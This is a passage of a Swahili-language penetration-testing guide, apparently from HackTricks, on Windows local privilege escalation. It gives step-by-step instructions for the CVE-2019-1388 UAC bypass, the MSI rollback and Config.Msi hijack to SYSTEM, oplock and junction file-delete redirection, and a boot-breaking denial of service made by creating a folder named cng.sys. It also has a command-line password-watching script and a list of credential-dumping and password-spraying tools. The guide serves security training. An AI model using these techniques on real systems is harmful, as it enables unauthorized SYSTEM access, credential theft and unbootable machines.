Windows inatoa kipengele kinachoitwa **Named Pipes**, kuruhusu michakato isiyohusiana kushiriki data, hata kupitia mitandao tofauti. Hii inafanana na usanifu wa client/server, na majukumu yamefafanuliwa kama **named pipe server** na **named pipe client**.

Wakati data inapotumwa kupitia pipe na **client**, **server** iliyoweka pipe ina uwezo wa **kuchukua utambulisho** wa **client**, ikizingatia kuwa ina haki zinazohitajika za **SeImpersonate**. Kutambua **mchakato mwenye idhini** unaozungumza kupitia pipe ambayo unaweza kuiga kunatoa fursa ya **kupata ruhusa za juu** kwa kuchukua utambulisho wa mchakato huo mara tu unapoingiliana na pipe uliyoanzisha. Kwa maagizo juu ya jinsi ya kufanya shambulio kama hilo, mwongozo wenye msaada unaweza kupatikana [**here**](named-pipe-client-impersonation.md) na [**here**](#from-high-integrity-to-system).

Pia zana zifuatazo zinakuwezesha **kuingilia mawasiliano ya named pipe kwa zana kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na zana hii inaruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Mengine

### File Extensions that could execute stuff in Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

Unapopata shell kama mtumiaji, kunaweza kuwa na kazi zilizopangwa au michakato mingine inayotekelezwa ambayo **inapitisha leseni kwenye mstari wa amri**. Skripti hapa chini inakamata mistari ya amri ya michakato kila sekunde mbili na inalinganisha hali ya sasa na hali iliyopita, ikitoa tofauti yoyote.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kuiba nywila kutoka kwa michakato

## Kutoka Mtumiaji wa Vibali Vidogo hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa una upatikanaji wa kiolesura cha picha (kupitia console au RDP) na UAC imewezeshwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na vibali.

Hii inafanya iwezekane kufanya escalate privileges na bypass UAC kwa wakati mmoja kwa udhaifu uleule. Zaidi ya hayo, hakuna haja ya kusakinisha chochote na binary inayotumika wakati wa mchakato imesainiwa na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathiriwa ni zifuatazo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Ili kutumia udhaifu huu, ni lazima utekeleze hatua zifuatazo:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Kutoka kwa Administrator Medium hadi High Integrity Level / UAC Bypass

Soma hili ili **ujifunze kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hili ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kutoka kwenye Futa/Kuhamisha/Kubadilisha Jina la Folda yoyote hadi SYSTEM EoP

Mbinu iliyofafanuliwa [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) pamoja na msimbo wa exploit [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Shambulio linajumuisha kutumia kipengele cha rollback cha Windows Installer kubadilisha faili halali kwa zile za uhasama wakati wa mchakato wa uninstall. Kwa hili mshambuliaji anahitaji kuunda **malicious MSI installer** itakayotumika kujiiba folda `C:\Config.Msi`, ambayo baadaye itatumika na Windows Installer kuhifadhi faili za rollback wakati wa kuondolewa kwa vifurushi vingine vya MSI ambapo faili za rollback zingeweza kurekebishwa ili kuwa na payload hasidi.

Mbinu iliyofupishwa ni ifuatayo:

1. **Hatua ya 1 – Kujiandaa kwa Hijack (acha `C:\Config.Msi` tupu)**

- Hatua 1: Sakinisha MSI
- Tengeneza `.msi` inayosakinisha faili lisilo hatari (mfano, `dummy.txt`) katika folda inayoweza kuandikwa (`TARGETDIR`).
- Chagua installer kama **"UAC Compliant"**, ili **mtumiaji asiye admin** aweze kuiendesha.
- Weka **handle** wazi kwa faili baada ya kusakinisha.

- Hatua 2: Anza Uninstall
- Uninstall `.msi` ile ile.
- Mchakato wa uninstall unaanza kuhamisha faili kwenda `C:\Config.Msi` na kuziacha majina kuwa `.rbf` files (rollback backups).
- **Endelea kuchunguza handle ya faili iliyo wazi** ukitumia `GetFinalPathNameByHandle` ili kugundua wakati faili inakuwa `C:\Config.Msi\<random>.rbf`.

- Hatua 3: Syncing Maalum
- `.msi` ina **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
- Inaashiria wakati `.rbf` imeandikwa.
- Kisha **inasubiri** tukio jingine kabla ya kuendelea na uninstall.

- Hatua 4: Zuia Kufutwa kwa `.rbf`
- Ukitumwa ishara, **fungua faili ya `.rbf`** bila `FILE_SHARE_DELETE` — hii **inazuia kufutwa kwake**.
- Kisha **tuma ishara nyuma** ili uninstall iishe.
- Windows Installer haifanyi kufuta `.rbf`, na kwa sababu haiwezi kufuta yaliyomo yote, **`C:\Config.Msi` haisiondolewa**.

- Hatua 5: Futa `.rbf` kwa mkono
- Wewe (mshambuliaji) unafuta faili `.rbf` kwa mkono.
- Sasa **`C:\Config.Msi` ni tupu**, tayari kuibiwa.

> Katika kipindi hiki, **anzisha hitilafu ya kufuta folda isiyochaguliwa kwa ngazi ya SYSTEM** kufuta `C:\Config.Msi`.

2. **Hatua ya 2 – Kubadilisha Rollback Scripts na Zenye Uhalifu**

- Hatua 6: Unda tena `C:\Config.Msi` na ACL dhaifu
- Unda tena folda `C:\Config.Msi` mwenyewe.
- Weka **DACLs dhaifu** (mfano, Everyone:F), na **weka handle wazi** na `WRITE_DAC`.

- Hatua 7: Endesha Install nyingine
- Sakinisha `.msi` tena, ukiwa na:
- `TARGETDIR`: Mahali pa kuandika.
- `ERROROUT`: Kigezo kinachosababisha kushindwa kwa lazima.
- Install hii itatumika kusababisha **rollback** tena, ambayo inasoma `.rbs` na `.rbf`.

- Hatua 8: Chunguza kwa `.rbs`
- Tumia `ReadDirectoryChangesW` kuchunguza `C:\Config.Msi` hadi `.rbs` mpya itaonekana.
- Chukua jina la faili yake.

- Hatua 9: Sync Kabla ya Rollback
- `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
- Inaashiria tukio wakati `.rbs` imeundwa.
- Kisha **inasubiri** kabla ya kuendelea.

- Hatua 10: Tumia tena ACL dhaifu
- Baada ya kupokea tukio la ` .rbs created`:
- Windows Installer **inatumia tena ACL kali** kwa `C:\Config.Msi`.
- Lakini kwa kuwa bado una handle na `WRITE_DAC`, unaweza **tumia tena ACL dhaifu** tena.

> ACLs zinafanywa **tu wakati handle imefunguliwa**, hivyo bado unaweza kuandika kwenye folda.

- Hatua 11: Weka `.rbs` na `.rbf` feki
- Bandikisha juu ya faili `.rbs` na **rollback script feki** inayowaambia Windows ili:
- Rejesha faili yako `.rbf` (DLL hasidi) katika **mahali lenye vipaumbele** (mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Weka `.rbf` yako feki inayojumuisha **DLL ya payload hasidi ya ngazi ya SYSTEM**.

- Hatua 12: Sababisha Rollback
- Tuma ishara ya sync ili installer iendelee.
- Kitendo maalum cha aina 19 (`ErrorOut`) kimepangwa ili **kufanya kusababisha kushindwa kwa kusakinisha kwa hiari** mahali panapojulikana.
- Hii husababisha **rollback kuanza**.

- Hatua 13: SYSTEM Inasakinisha DLL Yako
- Windows Installer:
- Inasoma `.rbs` yako hasidi.
- Inanakili DLL yako ya `.rbf` katika eneo lengwa.
- Sasa una **DLL yako hasidi katika njia inayopakiwa na SYSTEM**.

- Hatua ya Mwisho: Endesha msimbo wa SYSTEM
- Endesha binary unaoaminika wa **auto-elevated** (mfano, `osk.exe`) unaochukua DLL uliyoiiba.
- **Boom**: Msimbo wako unatekelezwa **kama SYSTEM**.


### Kutoka Futa/Hamisha/Badilisha Jina la Faili Yenyewe hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (ileo hapo juu) inaeleza kuwa unaweza kufuta **folda nzima** (mfano, `C:\Config.Msi`). Lakini vipi ikiwa udhaifu wako unaruhusu tu **kufuta faili yoyote** ?

Unaweza kutumia **NTFS internals**: kila folda ina hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Mtiririko huu unahifadhi **metadata ya index** ya folda.

Hivyo, ikiwa **utafuta mtiririko `::$INDEX_ALLOCATION`** wa folda, NTFS **itaondoa folda nzima** kutoka kwenye mfumo wa faili.

Unaweza kufanya hivyo kwa kutumia API za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Ingawa unaitisha API ya kufuta *file*, **inafuta folder yenyewe**.

### Kutoka Folder Contents Delete hadi SYSTEM EoP
Je, primitive yako hairuhusu kufuta files/folders yoyote, lakini **inaruhusu kufuta *contents* za attacker-controlled folder**?

1. Step 1: Andaa bait folder na file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Weka **oplock** kwenye `file1.txt`
- Oplock **inasitisha utekelezaji** wakati mchakato mwenye ruhusa anajaribu kufuta `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Hatua 3: Sababisha mchakato wa SYSTEM (mfano, `SilentCleanup`)
- Mchakato huu unachambua folda (mfano, `%TEMP%`) na unajaribu kufuta yaliyomo ndani yake.
- Inapofika kwenye `file1.txt`, **oplock triggers** na inatoa udhibiti kwa callback yako.

4. Hatua 4: Ndani ya callback ya oplock – elekeza tena ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
- Hili huifanya `folder1` kuwa tupu bila kuvunja oplock.
- Usifute `file1.txt` moja kwa moja — hiyo itaachilia oplock mapema.

- Chaguo B: Geuza `folder1` kuwa **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Hii inalenga mtiririko wa ndani wa NTFS unaohifadhi metadata ya folda — kuifuta inafuta folda.

5. Hatua ya 5: Achilia oplock
- Mchakato wa SYSTEM unaendelea na unajaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli inafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka Kuunda Folda ya Nasibu hadi DoS ya Kudumu

Tumia primitive inayoikuruhusu **kuunda folda yoyote kama SYSTEM/admin** — hata kama **hautiwezi kuandika faili** au **kusanidi ruhusa dhaifu**.

Unda **folda** (sio faili) yenye jina la **dereva muhimu wa Windows**, kwa mfano:
```
C:\Windows\System32\cng.sys
```
- Njia hii kwa kawaida inalingana na driver ya kernel-mode `cng.sys`.
- Ikiwa **utaiunda mapema kama folda**, Windows inashindwa kupakia driver halisi wakati wa boot.
- Kisha, Windows inajaribu kupakia `cng.sys` wakati wa boot.
- Inaiona folda, **inashindwa kutatua driver halisi**, na **inasababisha crash au kusimamisha boot**.
- Hakuna **njia mbadala**, na hakuna **urejesho** bila uingiliaji wa nje (kwa mfano, ukarabati wa boot au ufikiaji wa diski).


## **Kutoka High Integrity hadi System**

### **Huduma mpya**

Ikiwa tayari unafanya kazi kwenye mchakato wa High Integrity, **njia ya kupata SYSTEM** inaweza kuwa rahisi kwa **kuunda na kutekeleza service mpya**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wakati wa kuunda service binary hakikisha ni service halali au kwamba binary inatekeleza vitendo vinavyohitajika haraka kwani itauawa ndani ya 20s ikiwa sio service halali.

### AlwaysInstallElevated

Kutoka kwa High Integrity process unaweza kujaribu **kuwezesha AlwaysInstallElevated registry entries** na **kufunga** reverse shell kwa kutumia _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ikiwa una token privileges hizo (huenda utakutana nazo katika process ambayo tayari iko kwa High Integrity), utaweza **fungua karibu process yoyote** (si protected processes) kwa kutumia SeDebug privilege, **kunakili token** ya process, na kuunda **process yoyote kwa kutumia token hiyo**.\
Kutumia technique hii kwa kawaida ni **kuchagua process yoyote inayoendesha kama SYSTEM yenye token privileges zote** (_ndio, unaweza kupata SYSTEM processes zisizo na token privileges zote_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Technique hii inatumiwa na meterpreter kupandisha kiwango katika `getsystem`. Technique inajumuisha **kuunda pipe na kisha kuunda/kukutumia vibaya service kuandika kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia **`SeImpersonate`** privilege itaweza **kuiga token** ya client wa pipe (service) na kupata SYSTEM privileges.\
Ikiwa unataka [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
Ikiwa unataka kusoma mfano wa [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ikiwa utafanikiwa **hijack a dll** inayokuwa **loaded** na **process** inayofanya kazi kama **SYSTEM** utaweza kutekeleza arbitrary code kwa ruhusa hizo. Kwa hivyo Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation, na zaidi, ni **rahisi zaidi kufikiwa kutoka kwa process ya high integrity** kwa sababu itakuwa na **write permissions** kwenye folda zinazotumiwa kupakia dlls.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Unapaswa kucompile project kwa kutumia toleo sahihi la .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya mwathiri unaweza kufanya:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Marejeo

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

{{#include ../../banners/hacktricks-training.md}}
